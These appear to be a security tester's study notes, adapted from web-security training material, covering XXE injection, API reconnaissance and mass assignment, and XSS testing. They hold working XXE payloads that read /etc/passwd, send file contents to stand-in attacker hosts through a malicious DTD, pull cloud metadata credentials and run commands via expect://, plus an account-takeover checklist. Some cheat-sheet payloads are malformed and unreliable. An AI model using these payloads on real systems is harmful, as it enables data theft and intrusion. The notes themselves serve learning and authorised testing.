Manually testing for XXE vulnerabilities generally involves:

- Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.

- Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator is perfect for this purpose.

- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.

### **Note**

Keep in mind that XML is just a data transfer format. Make sure you also test any XML-based functionality for other vulnerabilities like XSS and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to obfuscate your attack in order to bypass weak defences.

</dd>
</dl>

</details>

<details>
<summary>Exploiting XXE to retrieve files</summary>

<dl>
<dd>

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.

- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. This causes the application's response to include the contents of the file:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### **Note**

With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.

</dd>
</dl>

</details>

<details>
<summary>Exploiting XXE to perform SSRF attacks</summary>

<dl>
<dd>

Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

</dd>
</dl>

</details>

<details>
<summary>Blind XXE vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>What is blind XXE?</summary>

<dl>
<dd>

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

- You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.

- You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

</dd>
</dl>

</details>

<details>
<summary>Detecting blind XXE using out-of-band (OAST) techniques</summary>

<dl>
<dd>

You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

**LAB :** **Blind XXE with out-of-band interaction**

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

```
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

```
%myparameterentity;
```

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

**LAB :** **Blind XXE with out-of-band interaction via XML parameter entities**

</dd>
</dl>

</details>

<details>
<summary>Exploiting blind XXE to exfiltrate data out-of-band</summary>

<dl>
<dd>

Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD carries out the following steps:

- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.

- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.

- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.

- Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:

```
http://web-attacker.com/malicious.dtd
```

Finally, the attacker must submit the following XXE payload to the vulnerable application:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the `/etc/passwd` file is transmitted to the attacker's server.

### **Note**

This technique might not work with some file contents, including the newline characters contained in the `/etc/passwd` file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.

**LAB** **Exploiting blind XXE to exfiltrate data using a malicious external DTD**

</dd>
</dl>

</details>

<details>
<summary>Exploiting blind XXE to retrieve data via error messages</summary>

<dl>
<dd>

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This DTD carries out the following steps:

- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.

- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.

- Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.

- Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

Invoking the malicious external DTD will result in an error message like the following:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**LAB :** **Exploiting blind XXE to retrieve data via error messages**

</dd>
</dl>

</details>

<details>
<summary>Exploiting blind XXE by repurposing a local DTD</summary>

<dl>
<dd>

The preceding technique works fine with an external DTD, but it won't normally work with an internal DTD that is fully specified within the `DOCTYPE` element. This is because the technique involves using an XML parameter entity within the definition of another parameter entity. Per the XML specification, this is permitted in external DTDs but not in internal DTDs. (Some parsers might tolerate it, but many do not.)

So what about blind XXE vulnerabilities when out-of-band interactions are blocked? You can't exfiltrate data via an out-of-band connection, and you can't load an external DTD from a remote server.

In this situation, it might still be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.

This means that an attacker can employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD. Of course, if out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location. Instead, it needs to be an external DTD file that is local to the application server. Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. This technique was pioneered by Arseniy Sharoglazov, and ranked #7 in our top 10 web hacking techniques of 2018.

For example, suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`, and this DTD file defines an entity called `custom_entity`. An attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following:

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

This DTD carries out the following steps:

- Defines an XML parameter entity called `local_dtd`, containing the contents of the external DTD file that exists on the server filesystem.

- Redefines the XML parameter entity called `custom_entity`, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the `/etc/passwd` file.

- Uses the `local_dtd` entity, so that the external DTD is interpreted, including the redefined value of the `custom_entity` entity. This results in the desired error message.

</dd>
</dl>

</details>

<details>
<summary>Locating an existing DTD file to repurpose</summary>

<dl>
<dd>

Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search.

**LAB :** **Exploiting XXE to retrieve data by repurposing a local DTD**

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Finding hidden attack surface for XXE injection</summary>

<dl>
<dd>

Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML.

<details>
<summary>### **XInclude attacks</summary>

<dl>
<dd>

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

</dd>
</dl>

</details>

<details>
<summary>### **XXE attacks via file upload</summary>

<dl>
<dd>

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

**Exploiting XXE via image file upload**

</dd>
</dl>

</details>

<details>
<summary>### **XXE attacks via modified content type</summary>

<dl>
<dd>

Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then you might be able submit the following request, with the same result:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>XXE with SSRF</summary>

<dl>
<dd>

<?xml version="1.0"?>  
<!DOCTYPE foo    
<!ELEMENT foo ([#ANY)>  
<!ENTITY xxe SYSTEM "http://localhost">]><foo>&xxe;</foo>

<details>
<summary></summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>XXE To RCE `php web-apps`</summary>

<dl>
<dd>

XXE to Remote Code Execution:  
  
<?xml version="1.0" encoding="ISO-8859-1"?>  
<!DOCTYPE foo  
 [<!ELEMENT foo ANY >  
 <!ENTITY xxe SYSTEM "expect://id" >]>  
<creds>  
 <user>`&xxe;`</user>  
 <pass>`mypass`</pass>  
</creds>

</dd>
</dl>

</details>

<details>
<summary>Cheatsheet</summary>

<dl>
<dd>

---

using external entities:  
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

perform SSRF attacks:  
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

---

Blind XXE with out-of-band interaction:  
<!DOCTYPE test  <!ENTITY xxe SYSTEM "[http://burp-collab"> ]>

---

Blind XXE with out-of-band interaction via XML parameter entities:  
<!DOCTYPE stockCheck <!ENTITY % xxe SYSTEM "[http://burp-collaborator> %xxe; ]>

---

blind XXE to exfiltrate data using a malicious external DTD:  
DTD file:  
<!ENTITY % file SYSTEM "file:///etc/passwd">  
<!ENTITY % eval "<!ENTITY % test SYSTEM 'http://burp-collaborator/?a=%file;'>">  
%eval;  
%test;  
XXE Payload:  
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

---

blind XXE to retrieve data via error messages:  
DTD file:  
<!ENTITY % passwd SYSTEM "file:///etc/passwd">  
<!ENTITY % notvalid "<!ENTITY % test SYSTEM 'file:///invalid/%file;'>">  
%notvalid;  
%test;  
XXE Payload:  
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

---

XInclude to retrieve files:  
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

---

XXE via image file upload:  
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

---

XXE inside SOAP body:  
soap:Body<foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>

---

XXE: Base64 Encoded:  
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

---

XXE inside SVG:  
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">  
<image xlink:href="expect://ls"></image>  
</svg>

---

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>API Testing</summary>

<dl>
<dd>

<details>
<summary>APIs</summary>

<dl>
<dd>

(Application Programming Interfaces) enable software systems and applications to communicate and share data. API testing is important as vulnerabilities in APIs may undermine core aspects of a website's confidentiality, integrity, and availability.

</dd>
</dl>

</details>

<details>
<summary>API Recon</summary>

<dl>
<dd>

## To start API testing, you first need to find out as much information about the API as possible, to discover its attack surface.

To begin, you should identify API endpoints. These are locations where an API receives requests about a specific resource on its server. For example, consider the following `GET` request:

```
GET /api/books HTTP/1.1
Host: example.com
```

The API endpoint for this request is `/api/books`. This results in an interaction with the API to retrieve a list of books from a library. Another API endpoint might be, for example, `/api/books/mystery`, which would retrieve a list of mystery books.

Once you have identified the endpoints, you need to determine how to interact with them. This enables you to construct valid HTTP requests to test the API. For example, you should find out information about the following:

- The input data the API processes, including both compulsory and optional parameters.

- The types of requests the API accepts, including supported HTTP methods and media formats.

- Rate limits and authentication mechanisms.

</dd>
</dl>

</details>

<details>
<summary>API documentation</summary>

<dl>
<dd>

APIs are usually documented so that developers know how to use and integrate with them.

Documentation can be in both human-readable and machine-readable forms. Human-readable documentation is designed for developers to understand how to use the API. It may include detailed explanations, examples, and usage scenarios. Machine-readable documentation is designed to be processed by software for automating tasks like API integration and validation. It's written in structured formats like JSON or XML.

API documentation is often publicly available, particularly if the API is intended for use by external developers. If this is the case, always start your recon by reviewing the documentation.

<details>
<summary>### **Discovering API documentation</summary>

<dl>
<dd>

Even if API documentation isn't openly available, you may still be able to access it by browsing applications that use the API.

To do this, you can use Burp Scanner to crawl the API. You can also browse applications manually using Burp's browser. Look for endpoints that may refer to API documentation, for example:

- `/api`

- `/swagger/index.html`

- `/openapi.json`

If you identify an endpoint for a resource, make sure to investigate the base path. For example, if you identify the resource endpoint `/api/swagger/v1/users/123`, then you should investigate the following paths:

- `/api/swagger/v1`

- `/api/swagger`

- `/api`

You could also use a list of common paths to directly fuzz for documentation.

**Exploiting an API endpoint using documentation**

</dd>
</dl>

</details>

<details>
<summary>Using machine-readable documentation</summary>

<dl>
<dd>

You can use a range of automated tools to analyze any machine-readable API documentation that you find.

You can use Burp Scanner to crawl and audit OpenAPI documentation, or any other documentation in JSON or YAML format. You can also parse OpenAPI documentation using the OpenAPI Parser extension.

You may also be able to use a specialized tool to test the documented endpoints, such as Postman or SoapUI.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Identifying API endpoints</summary>

<dl>
<dd>

You can also gather a lot of information by browsing applications that use the API. This is often worth doing even if you have access to API documentation, as sometimes documentation may be inaccurate or out of date.

You can use Burp Scanner to crawl the application, then manually investigate interesting attack surface using Burp's browser.

While browsing the application, look for patterns that suggest API endpoints in the URL structure, such as `/api/`. Also look out for JavaScript files. These can contain references to API endpoints that you haven't triggered directly via the web browser. Burp Scanner automatically extracts some endpoints during crawls, but for a more heavyweight extraction, use the JS Link Finder BApp. You can also manually review JavaScript files in Burp : JS Link Finder

<details>
<summary>### **Interacting with API endpoints</summary>

<dl>
<dd>

Once you've identified API endpoints, interact with them using Burp Repeater and Burp Intruder. This enables you to observe the API's behavior and discover additional attack surface. For example, you could investigate how the API responds to changing the HTTP method and media type.

As you interact with the API endpoints, review error messages and other responses closely. Sometimes these include information that you can use to construct a valid HTTP request.

<details>
<summary>### **Identifying supported HTTP methods</summary>

<dl>
<dd>

The HTTP method specifies the action to be performed on a resource. For example:

- `GET` - Retrieves data from a resource.

- `PATCH` - Applies partial changes to a resource.

- `OPTIONS` - Retrieves information on the types of request methods that can be used on a resource.

An API endpoint may support different HTTP methods. It's therefore important to test all potential methods when you're investigating API endpoints. This may enable you to identify additional endpoint functionality, opening up more attack surface.

For example, the endpoint `/api/tasks` may support the following methods:

- `GET /api/tasks` - Retrieves a list of tasks.

- `POST /api/tasks` - Creates a new task.

- `DELETE /api/tasks/1` - Deletes a task.

You can use the built-in **HTTP verbs** list in Burp Intruder to automatically cycle through a range of methods.

**Note :**

When testing different HTTP methods, target low-priority objects. This helps make sure that you avoid unintended consequences, for example altering critical items or creating excessive records.

</dd>
</dl>

</details>

<details>
<summary>### **Identifying supported content types</summary>

<dl>
<dd>

API endpoints often expect data in a specific format. They may therefore behave differently depending on the content type of the data provided in a request. Changing the content type may enable you to:

- Trigger errors that disclose useful information.

- Bypass flawed defenses.

- Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

To change the content type, modify the `Content-Type` header, then reformat the request body accordingly. You can use the Content Type Convertor BApp to automatically convert data submitted within requests between XML and JSON.

Content type converter

**Finding and exploiting an unused API endpoint**

</dd>
</dl>

</details>

<details>
<summary>### **Fuzzing to find hidden endpoints</summary>

<dl>
<dd>

Once you have identified some initial API endpoints, you can fuzz to uncover hidden endpoints. For example, consider a scenario where you have identified the following API endpoint for updating user information:

`PUT /api/user/update`

To identify hidden endpoints, you could use Burp Intruder to fuzz for other resources with the same structure. For example, you could fuzz the `/update` position of the path with a list of other common functions, such as `delete` and `add`.

When fuzzing, use wordlists based on common API naming conventions and industry terms. Make sure you also include terms that are relevant to the application, based on your initial recon.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Finding hidden parameters</summary>

<dl>
<dd>

When you're doing API recon, you may find undocumented parameters that the API supports. You can attempt to use these to change the application's behavior. Burp includes numerous tools that can help you identify hidden parameters:

- Burp Intruder enables you to fuzz for hidden parameters, using a wordlist of common parameter names to replace existing parameters or add new parameters. Make sure you also include names that are relevant to the application, based on your initial recon.

- The Param miner extension enables you to automatically guess up to 65,536 param names per request. Param miner automatically guesses names that are relevant to the application, based on information taken from the scope.

- The Content discovery tool enables you to discover content that isn't linked from visible content that you can browse to, including parameters.

### **Related pages**

- Param miner

- Content discovery

<details>
<summary>### **Mass assignment vulnerabilities</summary>

<dl>
<dd>

Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

<details>
<summary>Identifying hidden parameters</summary>

<dl>
<dd>

Since mass assignment creates parameters from object fields, you can often identify these hidden parameters by manually examining objects returned by the API.

For example, consider a `PATCH /api/users/ request`, which enables users to update their username and email, and includes the following JSON:

```
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

A concurrent `GET /api/users/123` request returns the following JSON:

```
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

This may indicate that the hidden `id` and `isAdmin` parameters are bound to the internal user object, alongside the updated username and email parameters.

</dd>
</dl>

</details>

<details>
<summary>Testing mass assignment vulnerabilities</summary>

<dl>
<dd>

To test whether you can modify the enumerated `isAdmin` parameter value, add it to the `PATCH` request:

```
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false,
}
```

In addition, send a `PATCH` request with an invalid `isAdmin` parameter value:

```
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "foo",
}
```

If the application behaves differently, this may suggest that the invalid value impacts the query logic, but the valid value doesn't. This may indicate that the parameter can be successfully updated by the user.

You can then send a `PATCH` request with the `isAdmin` parameter value set to `true`, to try and exploit the vulnerability:

```
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true,
}
```

If the `isAdmin` value in the request is bound to the user object without adequate validation and sanitization, the user wiener may be incorrectly granted admin privileges. To determine whether this is the case, browse the application as wiener to see whether you can access admin functionality.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Server-side parameter pollution</summary>

<dl>
<dd>

https://portswigger.net/web-security/api-testing/server-side-parameter-pollution

</dd>
</dl>

</details>

<details>
<summary>Search for following in js files to find API endpoints</summary>

<dl>
<dd>

> axios  
> fetch(  
> .get(  
> .post(  
> XMLHttpRequest

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>XSS</summary>

<dl>
<dd>

<details>
<summary>Exploiting XSS</summary>

<dl>
<dd>

https://portswigger.net/web-security/cross-site-scripting/exploiting

<details>
<summary>Building POC to leak PII by @zseano</summary>

<dl>
<dd>

https://www.youtube.com/watch?v=fcAklNSta-U&list=PLKAaMVNxvLmAcY4n3an_SPwpfseHzZ6Yo&index=5

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>XSS context</summary>

<dl>
<dd>

https://portswigger.net/web-security/cross-site-scripting/contexts

</dd>
</dl>

</details>

<details>
<summary>XSS -> ATO Escalation</summary>

<dl>
<dd>

- Change email -> password reset

- Change password

- Change phone -> SMS password reset

- Change security questions

- Add SSO login (login with GitHub, ect)

- Force logout -> Session Fixation

- Steal session token via non-HTTP only cookie

- Steal session token via insecure embed in page

- Steal API key for application

- Add admin user to organization

- Hijack oAuth flow and steal code

- Steal SSO code to adjacent app, then reverse SSO back to main app

- Add authentication method (SMS, email, etc)

- Gain access to refresh token for JWT or session

https://x.com/Rhynorater/status/1682401924635566080?s=20

</dd>
</dl>

</details>

<details>
<summary>How to find and test for stored XSS vulnerabilities</summary>

<dl>
<dd>

Many stored XSS vulnerabilities can be found using Burp Suite's web vulnerability scanner.

Testing for stored XSS vulnerabilities manually can be challenging. You need to test all relevant "entry points" via which attacker-controllable data can enter the application's processing, and all "exit points" at which that data might appear in the application's responses.

Entry points into the application's processing include:

- Parameters or other data within the URL query string and message body.

- The URL file path.

- HTTP request headers that might not be exploitable in relation to reflected XSS.

- Any out-of-band routes via which an attacker can deliver data into the application. The routes that exist depend entirely on the functionality implemented by the application: a webmail application will process data received in emails; an application displaying a Twitter feed might process data contained in third-party tweets; and a news aggregator will include data originating on other web sites.

The exit points for stored XSS attacks are all possible HTTP responses that are returned to any kind of application user in any situation.

The first step in testing for stored XSS vulnerabilities is to locate the links between entry and exit points, whereby data submitted to an entry point is emitted from an exit point. The reasons why this can be challenging are that:

- Data submitted to any entry point could in principle be emitted from any exit point. For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users.

- Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches.

To comprehensively identify links between entry and exit points would involve testing each permutation separately, submitting a specific value into the entry point, navigating directly to the exit point, and determining whether the value appears there. However, this approach is not practical in an application with more than a few pages.

Instead, a more realistic approach is to work systematically through the data entry points, submitting a specific value into each one, and monitoring the application's responses to detect cases where the submitted value appears. Particular attention can be paid to relevant application functions, such as comments on blog posts. When the submitted value is observed in a response, you need to determine whether the data is indeed being stored across different requests, as opposed to being simply reflected in the immediate response.

When you have identified links between entry and exit points in the application's processing, each link needs to be specifically tested to detect if a stored XSS vulnerability is present. This involves determining the context within the response where the stored data appears and testing suitable candidate XSS payloads that are applicable to that context. At this point, the testing methodology is broadly the same as for finding reflected XSS vulnerabilities.

</dd>
</dl>

</details>

<details>
<summary>How to find and test for reflected XSS vulnerabilities</summary>

<dl>
<dd>

The vast majority of reflected cross-site scripting vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

Testing for reflected XSS vulnerabilities manually involves the following steps:

- **Test every entry point.** Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers, although XSS-like behavior that can only be triggered via certain HTTP headers may not be exploitable in practice.

- **Submit random alphanumeric values.** For each entry point, submit a unique random value and determine whether the value is reflected in the response. The value should be designed to survive most input validation, so needs to be fairly short and contain only alphanumeric characters. But it needs to be long enough to make accidental matches within the response highly unlikely. A random alphanumeric value of around 8 characters is normally ideal. You can use Burp Intruder's number payloads [https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types#numbers] with randomly generated hex values to generate suitable random values. And you can use Burp Intruder's grep payloads settings to automatically flag responses that contain the submitted value.

- **Determine the reflection context.** For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.

- **Test a candidate payload.** Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response. The easiest way to test payloads is to send the request to Burp Repeater, modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked. An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. Then set the random value as the search term in Burp Repeater's response view. Burp will highlight each location where the search term appears, letting you quickly locate the reflection.

- **Test alternative payloads.** If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed. For more details, see cross-site scripting contexts

- **Test the attack in a browser.** Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser (by pasting the URL into the address bar, or by modifying the request in Burp Proxy's intercept view, and see if the injected JavaScript is indeed executed. Often, it is best to execute some simple JavaScript like `alert(document.domain)` which will trigger a visible popup within the browser if the attack succeeds.

</dd>
</dl>

</details>

<details>
<summary>XSS finding Tips :</summary>

<dl>
<dd>

<details>
<summary>Using Google dorking and web archive</summary>

<dl>
<dd>

e.g,

site:host ext:php  
Site:host ext:asp  
site:host ext:aspx

http://web.archive.org

</dd>
</dl>

</details>

<details>
<summary>Play with paramters</summary>

<dl>
